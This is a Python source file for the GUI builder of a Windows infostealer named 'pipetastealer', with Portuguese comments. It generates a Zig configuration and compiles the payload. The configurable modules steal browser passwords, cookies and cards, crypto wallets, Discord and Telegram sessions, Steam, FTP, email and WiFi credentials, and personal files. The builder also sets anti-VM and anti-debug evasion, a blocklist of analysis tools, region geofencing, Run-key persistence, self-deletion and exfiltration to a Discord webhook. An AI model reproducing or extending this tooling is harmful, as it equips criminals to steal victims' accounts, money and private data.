#!/usr/bin/env python3
"""
pipetastealer builder — QML + Python backend
Gera ajuste.zig e compila com zig build. Nao vai junto no payload.
"""

import shutil
import subprocess
import sys
import threading
import time
from pathlib import Path

from PySide6.QtCore import Property, QObject, Signal, Slot
from PySide6.QtGui import QGuiApplication
from PySide6.QtQml import QQmlApplicationEngine


PROJECT_ROOT = Path(__file__).resolve().parent.parent
AJUSTE_PATH = PROJECT_ROOT / "src" / "ajuste.zig"
EXE_PATH = PROJECT_ROOT / "zig-out" / "bin" / "pipetastealer.exe"

# (propriedade, titulo, descricao, grupo) — fonte unica do dashboard, da UI e do ajuste.zig
MODULES = (
    ("roubar_navegadores", "Navegadores", "senhas, cookies, cartoes, historico", "coleta"),
    ("roubar_crypto", "Carteiras crypto", "12 extensoes + 8 desktop", "coleta"),
    ("roubar_discord", "Discord", "tokens plaintext + DPAPI", "coleta"),
    ("roubar_telegram", "Telegram", "tdata", "coleta"),
    ("roubar_steam", "Steam", "ssfn + config + registry", "coleta"),
    ("roubar_filezilla", "FileZilla", "credenciais FTP", "coleta"),
    ("roubar_outlook", "Outlook", "Windows Credential Manager", "coleta"),
    ("roubar_thunderbird", "Thunderbird", "NSS", "coleta"),
    ("roubar_wifi", "WiFi", "perfis + senhas", "coleta"),
    ("pegador_arquivos", "File Grabber", "varredura recursiva", "coleta"),
    ("tirar_captura", "Screenshot", "JPEG via GDI+", "coleta"),
    ("coletar_info_sistema", "System info", "OS, CPU, RAM, IP", "coleta"),
    ("anti_vm", "Anti-VM", "CPUID + MAC + DLL de sandbox + sleep skew", "stealth"),
    ("anti_debug", "Anti-debug", "PEB + rdtsc + CheckRemoteDebugger", "stealth"),
    ("human_interaction", "Human interaction", "mouse + teclado", "stealth"),
    ("indirect_syscalls", "Indirect syscalls", "gadget no ntdll", "stealth"),
    ("api_hashing", "API hashing", "FNV-1a, zero nomes em claro", "stealth"),
    ("stack_strings", "Stack strings", "descriptografa na stack", "stealth"),
    ("persistir", "HKCU Run key", "sobrevive a reboot", "persistencia"),
    ("auto_destruir", "Self-delete", "rename-and-reopen", "persistencia"),
)

GEOFENCE_PRESETS = {
    "none": [],
    "cis": ["0x0419", "0x0422", "0x0423"],
    "asia": ["0x0804", "0x0411", "0x0412"],
    "middle_east": ["0x0429", "0x0436", "0x044D"],
    "all_except_western": [
        "0x0419", "0x0422", "0x0423", "0x0804",
        "0x0411", "0x0412", "0x0429", "0x0436", "0x044D",
    ],
}


def _prop(ptype, attr, notify):
    """Property com notify: o QML rebind sozinho quando o valor muda."""

    def getter(self):
        return getattr(self, attr)

    def setter(self, value):
        if getattr(self, attr) == value:
            return
        setattr(self, attr, value)
        self.configChanged.emit()

    return Property(ptype, getter, setter, notify=notify)


class BuilderBackend(QObject):
    outputChanged = Signal(str)
    statusChanged = Signal(str)
    buildStarted = Signal()
    buildFinished = Signal(int)
    configChanged = Signal()
    metricsChanged = Signal()
    buildingChanged = Signal()

    # ===== Modulos (bool) =====
    roubar_navegadores = _prop(bool, "_roubar_navegadores", configChanged)
    roubar_crypto = _prop(bool, "_roubar_crypto", configChanged)
    roubar_discord = _prop(bool, "_roubar_discord", configChanged)
    roubar_telegram = _prop(bool, "_roubar_telegram", configChanged)
    roubar_steam = _prop(bool, "_roubar_steam", configChanged)
    roubar_filezilla = _prop(bool, "_roubar_filezilla", configChanged)
    roubar_outlook = _prop(bool, "_roubar_outlook", configChanged)
    roubar_thunderbird = _prop(bool, "_roubar_thunderbird", configChanged)
    roubar_wifi = _prop(bool, "_roubar_wifi", configChanged)
    pegador_arquivos = _prop(bool, "_pegador_arquivos", configChanged)
    tirar_captura = _prop(bool, "_tirar_captura", configChanged)
    coletar_info_sistema = _prop(bool, "_coletar_info_sistema", configChanged)
    anti_vm = _prop(bool, "_anti_vm", configChanged)
    anti_debug = _prop(bool, "_anti_debug", configChanged)
    human_interaction = _prop(bool, "_human_interaction", configChanged)
    indirect_syscalls = _prop(bool, "_indirect_syscalls", configChanged)
    api_hashing = _prop(bool, "_api_hashing", configChanged)
    stack_strings = _prop(bool, "_stack_strings", configChanged)
    persistir = _prop(bool, "_persistir", configChanged)
    auto_destruir = _prop(bool, "_auto_destruir", configChanged)

    # ===== Campos =====
    geofence = _prop(str, "_geofence", configChanged)
    geofence_custom = _prop(str, "_geofence_custom", configChanged)
    tamanho_max_arquivo = _prop(int, "_tamanho_max_arquivo", configChanged)
    caminhos_pegador = _prop(str, "_caminhos_pegador", configChanged)
    extensoes_arquivo = _prop(str, "_extensoes_arquivo", configChanged)
    process_blocklist = _prop(str, "_process_blocklist", configChanged)
    webhook_url = _prop(str, "_webhook_url", configChanged)
    optimize = _prop(str, "_optimize", configChanged)
    target = _prop(str, "_target", configChanged)

    def __init__(self):
        super().__init__()
        self._output = ""
        self._status = "pronto"
        self._building = False

        self._last_build_ok = False
        self._last_build_size_kb = 0
        self._last_build_ms = 0
        self._last_build_when = "--:--:--"
        self._build_count = 0

        for name, *_ in MODULES:
            setattr(self, "_" + name, name not in ("persistir", "auto_destruir"))

        self._geofence = "cis"
        self._geofence_custom = ""
        self._tamanho_max_arquivo = 5
        self._caminhos_pegador = "Desktop,Documents,Downloads"
        self._extensoes_arquivo = (
            ".txt,.doc,.docx,.xls,.xlsx,.pdf,.json,.csv,.db,.sqlite,"
            ".key,.pem,.ppk,.kdbx,.rdp,.ovpn,.conf,.wallet,.dat"
        )
        self._process_blocklist = (
            "vmtoolsd.exe\nvmwaretray.exe\nvmwareuser.exe\n"
            "vboxservice.exe\nvboxtray.exe\nxenservice.exe\n"
            "qemu-ga.exe\nsandboxiedcomlaunch.exe\nsandboxierpcss.exe\n"
            "sbiectrl.exe\ncuckoomon.exe\ncuckooagent.exe\n"
            "wireshark.exe\nprocmon.exe\nprocmon64.exe\n"
            "x64dbg.exe\nx32dbg.exe\nollydbg.exe\n"
            "fiddler.exe\nhttpdebugger.exe\nida.exe\nida64.exe\nghidrarun.exe"
        )
        self._webhook_url = "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN"
        self._optimize = "ReleaseFast"
        self._target = "x86_64-windows-gnu"

        # toolchain — mostrado na barra de status do dashboard
        self._toolchain, self._toolchain_ok = self._detect_toolchain()

    @staticmethod
    def _detect_toolchain():
        try:
            proc = subprocess.run(
                ["zig", "version"], capture_output=True, text=True, timeout=5
            )
            version = proc.stdout.strip()
            if proc.returncode == 0 and version:
                return f"zig {version}", True
            return "zig indisponivel", False
        except FileNotFoundError:
            return "zig nao encontrado", False
        except Exception:  # noqa: BLE001
            return "zig indisponivel", False

    # ===== Estado =====
    @Property(str, notify=outputChanged)
    def output(self):
        return self._output

    @Property(str, notify=statusChanged)
    def status(self):
        return self._status

    @Property(bool, notify=buildingChanged)
    def building(self):
        return self._building

    @Property(str, constant=True)
    def projeto(self):
        return str(PROJECT_ROOT)

    @Property(str, constant=True)
    def exe_path(self):
        return str(EXE_PATH)

    @Property(str, constant=True)
    def toolchain(self):
        return self._toolchain

    @Property(bool, constant=True)
    def toolchain_ok(self):
        return self._toolchain_ok

    # ===== Metricas do dashboard =====
    @Property(bool, notify=metricsChanged)
    def last_build_ok(self):
        return self._last_build_ok

    @Property(int, notify=metricsChanged)
    def last_build_size_kb(self):
        return self._last_build_size_kb

    @Property(int, notify=metricsChanged)
    def last_build_ms(self):
        return self._last_build_ms

    @Property(str, notify=metricsChanged)
    def last_build_when(self):
        return self._last_build_when

    @Property(int, notify=metricsChanged)
    def build_count(self):
        return self._build_count

    def _ativos(self, grupo):
        return sum(
            1 for name, _t, _d, g in MODULES
            if g == grupo and getattr(self, "_" + name)
        )

    def _total(self, grupo):
        return sum(1 for _n, _t, _d, g in MODULES if g == grupo)

    @Property(int, notify=configChanged)
    def coleta_ativos(self):
        return self._ativos("coleta")

    @Property(int, notify=configChanged)
    def coleta_total(self):
        return self._total("coleta")

    @Property(int, notify=configChanged)
    def stealth_ativos(self):
        return self._ativos("stealth")

    @Property(int, notify=configChanged)
    def stealth_total(self):
        return self._total("stealth")

    @Property(int, notify=configChanged)
    def persistencia_ativos(self):
        return self._ativos("persistencia")

    @Property(int, notify=configChanged)
    def persistencia_total(self):
        return self._total("persistencia")

    @Property("QVariantList", notify=configChanged)
    def modulos(self):
        return [
            {
                "nome": titulo,
                "sub": desc,
                "grupo": grupo,
                "on": bool(getattr(self, "_" + name)),
            }
            for name, titulo, desc, grupo in MODULES
        ]

    @Property(int, notify=configChanged)
    def blocklist_total(self):
        return len([p for p in self._process_blocklist.splitlines() if p.strip()])

    @Property(bool, notify=configChanged)
    def webhook_ok(self):
        url = self._webhook_url.strip()
        return url.startswith("https://") and "YOUR_ID" not in url and "YOUR_TOKEN" not in url

    @Property(str, notify=configChanged)
    def webhook_host(self):
        host, _path = self._split_webhook()
        return host or "—"

    @Property(str, notify=configChanged)
    def webhook_path(self):
        _host, path = self._split_webhook()
        return path

    @Property(int, notify=configChanged)
    def extensoes_total(self):
        return len([e for e in self._extensoes_arquivo.split(",") if e.strip()])

    @Property(int, notify=configChanged)
    def geofence_langids_total(self):
        return len(self._get_geofence_langids())

    @Property(str, notify=configChanged)
    def geofence_langids_label(self):
        return ", ".join(self._get_geofence_langids()) or "— sem filtro de regiao —"

    @Property(str, notify=configChanged)
    def ajuste_preview(self):
        return self._generate_ajuste()

    # ===== Geofence =====
    def _get_geofence_langids(self):
        custom = self._geofence_custom.strip()
        if custom:
            return [x.strip() for x in custom.split(",") if x.strip()]
        return GEOFENCE_PRESETS.get(self._geofence, [])

    def _split_webhook(self):
        url = self._webhook_url.strip()
        if "discord.com" in url:
            return "discord.com", url.split("discord.com", 1)[1]
        return url, "/"

    # ===== Geracao do ajuste.zig =====
    def _generate_ajuste(self) -> str:
        def zbool(v):
            return "true" if v else "false"

        lines = [
            'const std = @import("std");',
            "",
            "// Gerado pelo builder — nao editar manualmente",
            "",
        ]
        for name, _t, _d, _g in MODULES:
            lines.append(f"pub const {name} = {zbool(getattr(self, '_' + name))};")
        lines.append("")

        langids = self._get_geofence_langids()
        lid_str = ", ".join(langids)
        lines.append(f"pub const geofence_langids = [_][]const u8{{ {lid_str} }};")
        lines.append("")

        max_bytes = self._tamanho_max_arquivo * 1024 * 1024
        lines.append(f"pub const tamanho_max_arquivo: i64 = {max_bytes};")
        lines.append("")

        exts = [e.strip() for e in self._extensoes_arquivo.split(",") if e.strip()]
        ext_str = ", ".join(f'"{e}"' for e in exts)
        lines.append(f"pub const extensoes_arquivo = [_][]const u8{{ {ext_str} }};")
        lines.append("")

        paths = [p.strip() for p in self._caminhos_pegador.split(",") if p.strip()]
        path_str = ", ".join(f'"{p}"' for p in paths)
        lines.append(f"pub const caminhos_pegador = [_][]const u8{{ {path_str} }};")
        lines.append("")
        lines.append("pub const max_screenshot_size: usize = 10 * 1024 * 1024;")
        lines.append("")

        procs = [p.strip() for p in self._process_blocklist.splitlines() if p.strip()]
        proc_str = ", ".join(f'"{p}"' for p in procs)
        lines.append(f"pub const process_blocklist = [_][]const u8{{ {proc_str} }};")
        lines.append("")

        wh_url = self._webhook_url.strip()
        if "discord.com" in wh_url:
            wh_host = "discord.com"
            wh_path = wh_url.split("discord.com", 1)[1]
        else:
            wh_host = wh_url
            wh_path = "/"
        lines.append(f'pub const webhook_host = "{wh_host}";')
        lines.append(f'pub const webhook_path = "{wh_path}";')
        lines.append("")

        return "\n".join(lines)

    # ===== Build =====
    @Slot()
    def build(self):
        if self._building:
            return
        self._set_building(True)
        self._output = ""
        self.outputChanged.emit("")
        self._set_status("compilando...")
        self.buildStarted.emit()
        threading.Thread(target=self._run_build, daemon=True).start()

    def _run_build(self):
        started = time.monotonic()
        code = 1
        try:
            self._emit(f"[*] escrevendo {AJUSTE_PATH}")
            AJUSTE_PATH.write_text(self._generate_ajuste(), encoding="utf-8")

            self._emit("[*] limpando .zig-cache")
            shutil.rmtree(PROJECT_ROOT / ".zig-cache", ignore_errors=True)

            cmd = [
                "zig", "build",
                f"-Dtarget={self._target}",
                f"-Doptimize={self._optimize}",
            ]
            self._emit(f"$ {' '.join(cmd)}")
            proc = subprocess.Popen(
                cmd,
                cwd=str(PROJECT_ROOT),
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
            )
            for line in proc.stdout:
                self._emit(line.rstrip())
            code = proc.wait()
        except FileNotFoundError:
            self._emit("[!] zig nao encontrado no PATH")
        except Exception as exc:  # noqa: BLE001 — build nunca deve derrubar a UI
            self._emit(f"[!] {type(exc).__name__}: {exc}")

        ms = int((time.monotonic() - started) * 1000)
        self._last_build_ms = ms
        self._last_build_when = time.strftime("%H:%M:%S")
        self._build_count += 1

        if code == 0 and EXE_PATH.exists():
            kb = int(EXE_PATH.stat().st_size / 1024)
            self._last_build_ok = True
            self._last_build_size_kb = kb
            self._emit(f"[+] {EXE_PATH}")
            self._emit(f"[+] {kb} KB ({kb / 1024:.2f} MB) em {ms / 1000:.1f}s")
            self._set_status(f"ok · {kb} KB · {ms / 1000:.1f}s")
        else:
            self._last_build_ok = False
            self._last_build_size_kb = 0
            self._emit(f"[!] falha (exit {code}) em {ms / 1000:.1f}s")
            self._set_status(f"falha · exit {code}")

        self.metricsChanged.emit()
        self._set_building(False)
        self.buildFinished.emit(0 if self._last_build_ok else 1)

    def _set_building(self, value):
        if self._building != value:
            self._building = value
            self.buildingChanged.emit()

    def _set_status(self, text):
        self._status = text
        self.statusChanged.emit(text)

    def _emit(self, line):
        self._output += line + "\n"
        self.outputChanged.emit(self._output)


def main():
    app = QGuiApplication(sys.argv)
    app.setOrganizationName("pipeta")
    app.setApplicationName("pipetastealer builder")

    engine = QQmlApplicationEngine()
    backend = BuilderBackend()
    engine.rootContext().setContextProperty("backend", backend)

    qml_file = Path(__file__).resolve().parent / "main.qml"
    engine.load(str(qml_file))

    if not engine.rootObjects():
        print("Erro: nao foi possivel carregar QML")
        sys.exit(-1)

    sys.exit(app.exec())


if __name__ == "__main__":
    main()
